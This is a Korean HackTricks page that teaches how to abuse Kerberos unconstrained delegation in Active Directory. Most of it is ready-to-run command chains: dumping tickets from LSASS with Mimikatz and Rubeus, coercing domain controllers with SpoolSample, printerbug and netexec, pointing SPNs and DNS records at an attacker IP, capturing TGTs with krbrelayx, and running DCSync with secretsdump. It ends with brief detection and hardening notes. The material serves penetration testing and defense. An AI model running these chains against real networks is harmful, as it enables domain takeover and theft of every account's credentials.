# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

도메인 관리자가 도메인 내의 모든 **Computer**에 설정할 수 있는 기능입니다. 그러면 **user가 Computer에 로그인할 때마다** 해당 user의 **TGT 사본이 DC가 제공하는 TGS에 포함되어 전송되고 LSASS 메모리에 저장됩니다**. 따라서 해당 머신에서 Administrator 권한이 있으면 **티켓을 덤프하고 모든 머신에서 user를 가장할 수 있습니다**.

따라서 "Unconstrained Delegation" 기능이 활성화된 Computer에 도메인 관리자가 로그인하고, 해당 머신에서 로컬 admin 권한이 있다면 티켓을 덤프하고 어디서든 도메인 관리자를 가장할 수 있습니다(domain privesc).

[userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) 속성에 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)이 포함되어 있는지 확인하면 **이 속성이 설정된 Computer 객체를 찾을 수 있습니다**. LDAP 필터 ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’를 사용하면 되며, powerview도 이 방법을 사용합니다:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Administrator(또는 피해 사용자)의 ticket을 **Mimikatz** 또는 **Pass the Ticket**을 위한 [**Rubeus**](pass-the-ticket.md)로 메모리에 로드합니다.\
자세한 내용: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**ired.team에서 Unconstrained delegation에 관한 자세한 정보 확인하기.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **강제 인증**

공격자가 **"Unconstrained Delegation"이 허용된 컴퓨터를 장악**할 수 있다면, **Print server**를 **속여** 해당 컴퓨터에 **자동으로 로그인하게** 하고 서버 메모리에 TGT를 저장할 수 있습니다.\
그러면 공격자는 **Pass the Ticket 공격을 수행해** Print server 컴퓨터 계정을 가장할 수 있습니다.

print server가 원하는 컴퓨터에 로그인하게 하려면 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)을 사용할 수 있습니다:

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

TGT가 도메인 컨트롤러에서 온 것이라면 [**DCSync attack**](acl-persistence-abuse/index.html#dcsync)을 수행해 DC의 모든 해시를 얻을 수 있습니다.\
[**이 공격에 대한 자세한 정보는 ired.team에서 확인하세요.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

여기서 **인증을 강제하는** 다른 방법을 확인하세요:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

피해자가 **Kerberos**를 사용해 unconstrained-delegation 호스트에 인증하도록 만드는 다른 강제 인증 수단도 사용할 수 있습니다. 최신 환경에서는 접근 가능한 RPC 인터페이스에 따라 기존 PrinterBug 흐름 대신 **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** 또는 **WebClient/WebDAV** 기반 강제 인증을 사용하는 경우가 많습니다.

### unconstrained delegation이 설정된 사용자/service account 악용

Unconstrained delegation은 **컴퓨터 객체에만 국한되지 않습니다**. **사용자/service account**에도 `TRUSTED_FOR_DELEGATION`을 설정할 수 있습니다. 이 경우 실질적인 요건은 해당 계정이 **소유한 SPN**에 대한 Kerberos 서비스 티켓을 받아야 한다는 것입니다.

이로 인해 매우 흔한 공격 경로 두 가지가 생깁니다.

1. unconstrained-delegation **사용자 계정**의 비밀번호/hash를 탈취한 다음, 동일한 계정에 **SPN을 추가**합니다.
2. 계정에 이미 하나 이상의 SPN이 있지만 그중 하나가 **오래되었거나 폐기된 호스트 이름**을 가리키는 경우, 누락된 **DNS A 레코드**를 다시 만들기만 하면 SPN 구성을 수정하지 않고도 인증 흐름을 가로챌 수 있습니다.<sup>[[8]](#references)</sup>

최소한의 Linux 흐름:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

메모:

- 이는 unconstrained principal이 **service account**이고, 도메인에 가입된 호스트에서 code execution 권한은 없고 자격 증명만 보유한 경우 특히 유용합니다.
- 대상 사용자에게 이미 **stale SPN**이 있다면, AD에 새 SPN을 기록하는 것보다 해당 **DNS record**를 다시 만드는 편이 덜 눈에 띌 수 있습니다.
- 최근 Linux 중심 tradecraft에서는 `addspn.py`, `dnstool.py`, `krbrelayx.py`와 하나의 coercion primitive를 사용합니다. 전체 공격 체인을 완성하는 데 Windows 호스트를 건드릴 필요는 없습니다.

### 공격자가 생성한 컴퓨터로 Unconstrained Delegation 악용하기

최신 도메인에서는 `MachineAccountQuota > 0`인 경우가 많습니다(기본값 10). 따라서 인증된 principal은 누구나 최대 N개의 컴퓨터 객체를 만들 수 있습니다. 여기에 `SeEnableDelegationPrivilege` token privilege(또는 이에 상응하는 권한)도 있다면, 새로 생성한 컴퓨터를 unconstrained delegation을 신뢰하도록 설정하고 권한이 높은 시스템에서 들어오는 TGT를 수집할 수 있습니다.<sup>[[1]](#references)</sup>

상위 수준의 흐름:

1) 자신이 제어하는 컴퓨터를 생성합니다.

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) 도메인 내에서 가짜 호스트 이름을 확인할 수 있도록 설정하기

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) 공격자가 제어하는 컴퓨터에서 Unconstrained Delegation 활성화

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

작동하는 이유: unconstrained delegation을 사용하면 delegation이 활성화된 컴퓨터의 LSA가 들어오는 TGT를 캐시합니다. DC나 privileged server가 가짜 호스트에 인증하도록 속이면 해당 컴퓨터의 TGT가 저장되며 내보낼 수 있습니다.

4) krbrelayx를 export mode로 시작하고 Kerberos 자료를 준비합니다.

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) DC/서버가 가짜 호스트에 인증하도록 강제하기

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx는 머신이 인증할 때 ccache 파일을 저장합니다. 예를 들면:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) 캡처한 DC 머신 TGT를 사용해 DCSync 수행

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

참고 사항 및 요구 사항:

- `MachineAccountQuota > 0`이면 권한이 없는 사용자도 computer를 생성할 수 있습니다. 그렇지 않으면 명시적인 권한이 필요합니다.
- computer에 `TRUSTED_FOR_DELEGATION`을 설정하려면 `SeEnableDelegationPrivilege`(또는 domain admin)가 필요합니다.
- DC가 FQDN으로 fake host에 연결할 수 있도록 fake host로 이름이 해석되는지(DNS A record) 확인합니다.
- Coercion에는 사용 가능한 vector(PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN 등)가 필요합니다. 가능하다면 DC에서 이러한 기능을 비활성화합니다.
- victim 계정에 **"Account is sensitive and cannot be delegated"**가 설정되어 있거나 **Protected Users**의 구성원이라면, forwarded TGT가 service ticket에 포함되지 않으므로 이 chain으로 재사용 가능한 TGT를 얻을 수 없습니다.<sup>[[9]](#references)</sup>
- 인증하는 client/server에서 **Credential Guard**가 활성화되어 있으면 Windows가 **Kerberos unconstrained delegation**을 차단합니다. 따라서 operator 관점에서 정상적인 coercion 경로도 실패할 수 있습니다.

탐지 및 hardening 아이디어:

- UAC `TRUSTED_FOR_DELEGATION`이 설정된 경우 Event ID 4741(computer account 생성) 및 4742/4738(computer/user account 변경)에 alert를 설정합니다.
- domain zone에서 비정상적인 DNS A-record 추가를 모니터링합니다.
- 예상치 못한 host에서 4768/4769가 급증하거나 DC가 non-DC host에 인증하는 상황을 감시합니다.
- `SeEnableDelegationPrivilege`를 최소한의 계정에만 허용하고, 가능한 경우 `MachineAccountQuota=0`으로 설정하며, DC에서 Print Spooler를 비활성화합니다. LDAP signing 및 channel binding을 적용합니다.

### Mitigation

- DA/Admin 로그인을 특정 service로 제한합니다.
- 권한이 있는 계정에 "Account is sensitive and cannot be delegated"를 설정합니다.

## References

- [1] [HTB: Delegate — SYSVOL 자격 증명 → Targeted Kerberoast → Unconstrained Delegation → DA 권한으로 DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – unrestricted delegation을 통한 domain 침해](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Active Directory의 Unconstrained Delegation](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – DC print server 및 Kerberos delegation을 통한 domain 침해](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
